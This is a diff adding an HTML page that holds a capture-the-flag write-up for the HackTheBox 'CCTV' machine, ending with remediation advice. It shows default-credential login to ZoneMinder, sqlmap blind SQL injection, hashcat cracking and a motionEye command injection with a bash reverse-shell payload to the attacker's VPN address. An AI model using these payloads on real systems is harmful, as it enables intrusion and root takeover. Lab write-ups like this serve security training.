@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Case File — CCTV</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Special+Elite&family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="case-file.css">
+<style>
+  .flag-redacted{
+    display:inline-block; vertical-align:middle;
+    height:15px; width:230px; max-width:60vw;
+    background: repeating-linear-gradient(90deg, var(--ink) 0 60%, transparent 0 100%);
+    background-color: var(--paper); background-size:14px 100%;
+    border-radius:2px; opacity:0.92;
+  }
+  .flag-row{display:flex;align-items:center;gap:10px;margin:10px 0;font-family:'IBM Plex Mono',monospace;font-size:0.85rem;}
+  .flag-label{color:var(--brass);text-transform:uppercase;letter-spacing:0.05em;font-size:0.72rem;min-width:64px;}
+  .stage table{width:100%;border-collapse:collapse;margin:14px 0;font-size:0.85rem;}
+  .stage table th,.stage table td{border:1px solid var(--panel-line);padding:8px 10px;text-align:left;color:var(--text);}
+  .stage table th{color:var(--brass);font-family:'IBM Plex Mono',monospace;font-size:0.72rem;text-transform:uppercase;}
+  .machine-cover{
+    width:100%;
+    max-height:280px;
+    object-fit:cover;
+    border-radius:6px;
+    border:1px solid var(--panel-line);
+    box-shadow:0 14px 34px rgba(0,0,0,0.45);
+    margin-bottom:24px;
+    display:block;
+  }
+</style>
+</head>
+<body>
+
+<nav>
+  <a href="../index.html" class="active">Dossier</a>
+  <a href="../case-files.html">Case Files</a>
+  <a href="../projects.html">Projects</a>
+  <a href="../blog.html">Blog</a>
+  <a href="../team.html">Team</a>
+  <a href="../contact.html">Contact</a>
+</nav> 
+
+<div class="topbar">
+  <a class="back" href="../case-files.html">&larr; Back to Case Files</a>
+  <span class="case-no">FILE NO. 2019-014</span>
+</div>
+
+<main>
+  <img class="machine-cover" src="../assets/img/machines/cctv.png" alt="CCTV — HackTheBox machine cover">
+  <span class="file-tab">Easy · Linux</span>
+  <h1>CCTV</h1>
+  <div class="subtitle">HackTheBox</div>
+  <div class="tags">
+    <span class="tag">Default Credentials</span>
+    <span class="tag">Blind SQLi</span>
+    <span class="tag">motionEye Command Injection</span>
+  </div>
+
+  <div class="chain">
+    <span class="node">Default Creds</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">Blind SQLi</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">Hash Crack</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">Client-Side Validation Bypass</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">Command Injection</span>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">01</span><h2>Reconnaissance</h2></div>
+    <p><strong>1.1 Add target to /etc/hosts</strong></p>
+    <pre><code>echo "&lt;TARGET_IP&gt; cctv.htb" | sudo tee -a /etc/hosts</code></pre>
+
+    <p><strong>1.2 Nmap scan</strong></p>
+    <pre><code>nmap -sC -sV -F &lt;TARGET_IP&gt; -oN nmap_fast.txt</code></pre>
+    <p><strong>Output:</strong></p>
+    <pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|_  256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
+80/tcp open  http    Apache httpd 2.4.58
+|_http-title: Did not follow redirect to http://cctv.htb/
+Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+    <p>Only SSH (22) and HTTP (80) open. The HTTP service redirects to the <code>cctv.htb</code> vhost.</p>
+    <div class="why"><strong>Why this mattered</strong>A branded "staff login" link is often the fastest way to the real attack surface on a themed box — worth following before doing broader enumeration.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">02</span><h2>Web Enumeration</h2></div>
+    <p><strong>2.1 Landing page</strong></p>
+    <pre><code>curl -s http://cctv.htb/ -v</code></pre>
+    <p>The site is a landing page for a fictional security company, <strong>SecureVision</strong>, offering CCTV monitoring services. A <strong>"Staff Login"</strong> button links to <code>/zm/</code> — a ZoneMinder instance.</p>
+
+    <p><strong>2.2 Default credentials on ZoneMinder</strong></p>
+    <p>Navigated to:</p>
+    <pre><code>http://cctv.htb/zm/</code></pre>
+    <p>Tried <mark>default credentials</mark>:</p>
+    <pre><code>Username: admin
+Password: admin</code></pre>
+    <p><strong>Result:</strong> Login succeeded immediately. Dashboard confirmed the running version in the top-right corner:</p>
+    <pre><code>ZoneMinder v1.37.63</code></pre>
+    <div class="why"><strong>Why this mattered</strong>Default credentials remain the single fastest way into a self-hosted admin panel — always worth trying before reaching for anything more sophisticated.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">03</span><h2>SQL Injection (removetag endpoint)</h2></div>
+    <p>ZoneMinder 1.37.63 has a known <mark>time-based blind SQL injection</mark> in the <code>request</code> view's <code>removetag</code> action, via the <code>tid</code> parameter.</p>
+
+    <p><strong>3.1 Confirm endpoint is reachable while authenticated</strong></p>
+    <p>Grabbed the session cookie from the browser (<code>ZMSESSID</code>) and tested manually:</p>
+    <pre><code>curl -s "http://cctv.htb/zm/index.php?view=request&amp;request=event&amp;action=removetag&amp;tid=1" \
+  -H "Cookie: ZMSESSID=ng38k44ur7ivus6a9t0uge0u3g" \
+  -v</code></pre>
+    <p><strong>Output:</strong></p>
+    <pre><code>&lt; HTTP/1.1 200 OK
+&lt; Content-Type: application/json
+{"result":"Ok","response":0}</code></pre>
+    <p>Endpoint reachable and authenticated.</p>
+
+    <p><strong>3.2 Build the sqlmap request file</strong></p>
+    <pre><code>cat > req.txt &lt;&lt; 'EOF'
+GET /zm/index.php?view=request&amp;request=event&amp;action=removetag&amp;tid=1 HTTP/1.1
+Host: cctv.htb
+User-Agent: Mozilla/5.0
+Cookie: ZMSESSID=ng38k44ur7ivus6a9t0uge0u3g; zmSkin=classic; zmCSS=base
+Connection: close
+
+EOF</code></pre>
+
+    <p><strong>3.3 Confirm injection with sqlmap</strong></p>
+    <pre><code>sqlmap -r req.txt -p tid --batch --technique=T</code></pre>
+    <p><strong>Key output:</strong></p>
+    <pre><code>[05:39:34] [INFO] GET parameter 'tid' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
+Parameter: tid (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: view=request&amp;request=event&amp;action=removetag&amp;tid=1 AND (SELECT 4617 FROM (SELECT(SLEEP(5)))zVMh)
+back-end DBMS: MySQL >= 5.0.12</code></pre>
+
+    <p><strong>3.4 Enumerate databases</strong></p>
+    <pre><code>sqlmap -r req.txt -p tid --batch --technique=T --dbs</code></pre>
+    <pre><code>available databases [3]:
+[*] information_schema
+[*] performance_schema
+[*] zm</code></pre>
+
+    <p><strong>3.5 Enumerate tables in zm</strong></p>
+    <pre><code>sqlmap -r req.txt -p tid --batch --technique=T -D zm --tables</code></pre>
+    <p><strong>Output (truncated to relevant table):</strong></p>
+    <pre><code>Database: zm
+[43 tables]
+...
+| Users                |
+...</code></pre>
+
+    <p><strong>3.6 Dump the Users table</strong></p>
+    <pre><code>sqlmap -r req.txt -p tid --batch --technique=T --dump -D zm -T Users</code></pre>
+    <p>Time-based blind extraction is slow (roughly 70-100 requests per character); the full dump eventually returned:</p>
+    <table>
+      <tr><th>Id</th><th>Name</th><th>Username</th><th>Password</th></tr>
+      <tr><td>1</td><td></td><td>superadmin</td><td>$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm</td></tr>
+      <tr><td>2</td><td>mark</td><td>mark</td><td>$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.</td></tr>
+      <tr><td>3</td><td>admin</td><td>admin</td><td>$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m</td></tr>
+    </table>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">04</span><h2>Cracking the mark Hash</h2></div>
+    <p><strong>4.1 Save the hash</strong></p>
+    <pre><code>echo '$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.' > hash.txt</code></pre>
+
+    <p><strong>4.2 Crack with hashcat (mode 3200 = bcrypt)</strong></p>
+    <pre><code>hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+    <p>At ~73 H/s (CPU-only, no GPU acceleration available), a full rockyou.txt run was estimated at <strong>2+ days</strong>. Left it running briefly and it cracked quickly regardless, since the correct password appeared early in the list:</p>
+    <p><strong>Output:</strong></p>
+    <pre><code>$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame
+
+Session..........: hashcat
+Status...........: Cracked
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)</code></pre>
+    <p><strong>Cracked credentials:</strong> <mark class="green">mark : opensesame</mark></p>
+    <div class="why"><strong>Why this mattered</strong>bcrypt is slow to brute-force at scale, but a weak underlying password still falls fast against a small, well-known wordlist — hash strength doesn't compensate for a bad password choice.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">05</span><h2>Initial Access (SSH as mark)</h2></div>
+    <pre><code>ssh mark@cctv.htb</code></pre>
+    <p>Password: <code>opensesame</code></p>
+    <pre><code>whoami
+id
+pwd
+ls -la
+cat user.txt
+ls /home</code></pre>
+    <p><strong>Output:</strong></p>
+    <pre><code>mark@cctv:~$ whoami
+mark
+mark@cctv:~$ id
+uid=1000(mark) gid=1000(mark) groups=1000(mark),24(cdrom),30(dip),46(plugdev)
+mark@cctv:~$ ls /home
+mark  sa_mark</code></pre>
+    <p>No <code>user.txt</code> in <code>mark</code>'s home directory — a second user, <code>sa_mark</code>, exists.</p>
+    <pre><code>ls -la /home/sa_mark</code></pre>
+    <pre><code>ls: cannot open directory '/home/sa_mark': Permission denied</code></pre>
+    <p>Access denied — privilege escalation / lateral movement required to reach the flag.</p>
+    <div class="why"><strong>Why this mattered</strong>When a target account's home directory looks empty of the expected artifact, that's usually a hint the box wants you to escalate or pivot laterally before it hands over anything else.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">06</span><h2>Enumeration for Privilege Escalation</h2></div>
+    <p><strong>6.1 Sudo rights</strong></p>
+    <pre><code>sudo -l</code></pre>
+    <pre><code>Sorry, user mark may not run sudo on cctv.</code></pre>
+
+    <p><strong>6.2 SUID binaries</strong></p>
+    <pre><code>find / -perm -4000 -type f 2>/dev/null</code></pre>
+    <p>Nothing unusual — only standard system SUID binaries (<code>passwd</code>, <code>sudo</code>, <code>su</code>, <code>mount</code>, <code>pkexec</code>, etc.).</p>
+
+    <p><strong>6.3 Listening ports</strong></p>
+    <pre><code>ss -tlnp 2>/dev/null</code></pre>
+    <p><strong>Output (relevant lines):</strong></p>
+    <pre><code>LISTEN  0  128   127.0.0.1:8765   0.0.0.0:*     &lt;- motionEye
+LISTEN  0  4096  127.0.0.1:7999   0.0.0.0:*     &lt;- motion control
+LISTEN  0  4096  127.0.0.1:8554   0.0.0.0:*     &lt;- RTSP
+LISTEN  0  151   127.0.0.1:3306   0.0.0.0:*     &lt;- MySQL</code></pre>
+    <p>Port <strong>8765</strong> (motionEye) is only bound to localhost — a web-based CCTV management interface, consistent with the box's theme.</p>
+
+    <p><strong>6.4 motionEye configuration files</strong></p>
+    <pre><code>cat /etc/motioneye/motioneye.conf</code></pre>
+    <p>Confirmed <code>listen 127.0.0.1</code> / <code>port 8765</code>.</p>
+    <pre><code>cat /etc/motioneye/motion.conf | grep -i admin</code></pre>
+    <p><strong>Output:</strong></p>
+    <pre><code># @admin_username admin
+# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0</code></pre>
+    <p>A commented-out admin credential pair with what looks like a <mark>SHA1 hash used as the literal password</mark>.</p>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">07</span><h2>Accessing motionEye</h2></div>
+    <p><strong>7.1 SSH local port forward</strong></p>
+    <pre><code>ssh -L 8765:127.0.0.1:8765 mark@cctv.htb</code></pre>
+
+    <p><strong>7.2 Login</strong></p>
+    <p>Navigated to <code>http://localhost:8765</code> and logged in with:</p>
+    <pre><code>Username: admin
+Password: 989c5a8ee87a0e9521ec81a79187d162109282f0</code></pre>
+    <p>The SHA1 hash string itself worked as the literal password — login succeeded.</p>
+
+    <p><strong>7.3 Version confirmation</strong></p>
+    <p>From the UI General Settings panel:</p>
+    <pre><code>motionEye Version: 0.43.1b4
+Motion Version:    4.7.1
+OS Version:        Ubuntu 24.04</code></pre>
+    <p>Confirmed from the shell as well:</p>
+    <pre><code>dpkg -l | grep -i motion
+pip3 show motioneye 2>/dev/null | grep -i version</code></pre>
+    <pre><code>ii  motion   4.7.1-1   amd64
+Version: 0.43.1b4</code></pre>
+    <p>This version of motionEye is affected by a known <mark class="rust">command injection</mark> vulnerability via the "Image File Name" configuration field, which is only validated client-side.</p>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">08</span><h2>Command Injection &rarr; Reverse Shell</h2></div>
+    <p><strong>8.1 Bypass client-side validation</strong></p>
+    <p>Opened browser DevTools (F12) &rarr; Console, and ran:</p>
+    <pre><code>configUiValid = function() {
+    return true;
+};</code></pre>
+    <p><em>This override must be re-applied on every fresh page load/navigation — it does not persist across tab switches or reloads.</em></p>
+
+    <p><strong>8.2 Verify injection point</strong></p>
+    <p>In the camera config panel, under Still Images &rarr; Image File Name, entered:</p>
+    <pre><code>$(touch /tmp/test).%Y-%m-%d-%H-%M-%S</code></pre>
+    <p>Clicked <strong>Apply</strong>. Confirmed on the server side that the config actually saved:</p>
+    <pre><code>cat /etc/motioneye/camera-1.conf | grep -i picture_filename</code></pre>
+    <pre><code>picture_filename $(touch /tmp/test).%Y-%m-%d-%H-%M-%S</code></pre>
+
+    <p><strong>8.3 Start a listener</strong></p>
+    <pre><code>nc -lvnp 4444</code></pre>
+
+    <p><strong>8.4 Set the reverse shell payload</strong></p>
+    <p>Replaced the Image File Name field with:</p>
+    <pre><code>$(python3 -c "import os;os.system('bash -c \"bash -i >&amp; /dev/tcp/&lt;kali vpn&gt;/4444 0>&amp;1\"')")</code></pre>
+    <p>Clicked <strong>Apply</strong>.</p>
+    <p>Confirmed the config saved correctly:</p>
+    <pre><code>cat /etc/motioneye/camera-1.conf | grep -i picture_filename</code></pre>
+    <pre><code>picture_filename $(python3 -c "import os;os.system('bash -c \"bash -i >&amp; /dev/tcp/&lt;kali vpn&gt;/4444 0>&amp;1\"')")</code></pre>
+
+    <p><strong>8.5 Trigger the payload</strong></p>
+    <p>Applying the config alone does not execute the command — the filename template is only evaluated when a picture is actually captured. Triggered a manual snapshot via the motion control API:</p>
+    <pre><code>curl -s "http://127.0.0.1:7999/1/action/snapshot"</code></pre>
+    <pre><code>Snapshot for camera 1
+Done</code></pre>
+
+    <p><strong>8.6 Catch the shell</strong></p>
+    <pre><code>┌──(burrito㉿kali)-[~]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [&lt;kali vpn&gt;] from (UNKNOWN) [&lt;TARGET_IP&gt;] 50180
+bash: cannot set terminal process group (5085): Inappropriate ioctl for device
+bash: no job control in this shell
+root@cctv:/etc/motioneye#</code></pre>
+    <p>The <code>motion</code>/<code>motioneye</code> service runs as <mark class="rust">root</mark> to access raw camera/video devices — the injected command executed with full root privileges immediately.</p>
+    <div class="why"><strong>Why this mattered</strong>Client-side-only validation is not a security boundary — it's a UX nicety an attacker's browser console can simply remove. Every constraint on a field's contents has to be enforced again on the server.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">09</span><h2>Post-Exploitation — Flags</h2></div>
+    <pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'
+whoami
+id
+cat /home/sa_mark/user.txt
+cat /root/root.txt</code></pre>
+    <p><strong>Output:</strong></p>
+    <pre><code>root@cctv:~# whoami
+root
+root@cctv:~# cat /home/sa_mark/user.txt
+&lt;USER_FLAG&gt;
+root@cctv:~# cat /root/root.txt
+&lt;ROOT_FLAG&gt;</code></pre>
+    <div class="flag-row"><span class="flag-label">User Flag</span><span class="flag-redacted"></span></div>
+    <div class="flag-row"><span class="flag-label">Root Flag</span><span class="flag-redacted"></span></div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">10</span><h2>Attack Chain Summary</h2></div>
+    <table>
+      <tr><th>Stage</th><th>Technique</th></tr>
+      <tr><td>Recon</td><td>Nmap → HTTP/SSH only, cctv.htb vhost</td></tr>
+      <tr><td>Initial foothold (web)</td><td>Default credentials admin:admin on ZoneMinder v1.37.63</td></tr>
+      <tr><td>Database access</td><td>Time-based blind SQLi in /zm/index.php?...&amp;action=removetag&amp;tid=</td></tr>
+      <tr><td>Credential access</td><td>Dumped bcrypt hashes from zm.Users, cracked mark's password (opensesame) via hashcat/rockyou</td></tr>
+      <tr><td>Shell access</td><td>SSH as mark — user.txt not present (belongs to sa_mark, permission denied)</td></tr>
+      <tr><td>Lateral recon</td><td>Found motioneye.conf / motion.conf on disk; recovered admin creds (hash-as-password) for local-only motionEye service (port 8765)</td></tr>
+      <tr><td>Privilege escalation</td><td>SSH local port-forward to reach motionEye UI → bypassed client-side validation in browser console → command injection via "Image File Name" field → reverse shell as root (motion/motioneye service runs as root)</td></tr>
+      <tr><td>Flags</td><td>user.txt (readable as root from sa_mark's home) and root.txt retrieved</td></tr>
+    </table>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">11</span><h2>Root Causes &amp; Remediation</h2></div>
+    <ul style="color:var(--text);font-size:0.95rem;">
+      <li><strong>Default credentials left enabled</strong> on ZoneMinder (admin:admin) — should be forced to change on first login.</li>
+      <li><strong>Unpatched ZoneMinder version</strong> (1.37.63) vulnerable to blind SQL injection in the removetag action — needs input sanitization / parameterized queries and prompt patching.</li>
+      <li><strong>Weak user password</strong> (opensesame) crackable via a common wordlist in under 2 minutes — enforce password complexity policies.</li>
+      <li><strong>Sensitive credentials stored in plaintext/hashed comments</strong> inside motion.conf, readable by a low-privilege local user — secrets should not be embedded in world-readable config files.</li>
+      <li><strong>Client-side-only input validation</strong> in motionEye's configuration UI, trivially bypassed via browser DevTools — all validation must be enforced server-side.</li>
+      <li><strong>Service running as root unnecessarily</strong> — motion/motioneye should run under a dedicated low-privilege service account with only the specific device permissions it needs (e.g., via udev rules/group membership), not full root.</li>
+    </ul>
+  </div>
+</main>
+
+<footer>
+  <a href="mailto:burritosec51@gmail.com">burritosec51@gmail.com</a>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  hljs.configure({ languages: ["bash","shell","powershell","python","json","yaml","sql","xml","ini","javascript","php"] });
+  document.querySelectorAll("pre code").forEach((block) => { hljs.highlightElement(block); });
+</script>
+</body>
+</html>
